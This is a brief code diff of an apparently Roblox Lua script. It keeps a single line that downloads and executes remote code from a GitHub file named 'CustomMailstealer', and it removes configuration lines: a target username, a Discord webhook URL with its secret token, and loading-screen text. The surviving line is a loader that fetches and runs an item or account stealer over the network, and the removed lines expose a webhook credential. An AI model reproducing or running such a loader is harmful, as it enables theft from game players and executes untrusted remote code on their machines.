@@ -1,7 +1,1 @@
-Username = "King_Pirate1653"
-Webhook = "https://discord.com/api/webhooks/1203314872625012786/eNkvCSr6XTOCijgFHTLWen9X07RSp-E_QrDDkVzVTycvIgwQh2pmhA3AWTBKRwi0gD6r"
-
-G_LoadingScreen = "Blxxxby ontop"
-G_WebhookName = "ez"
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
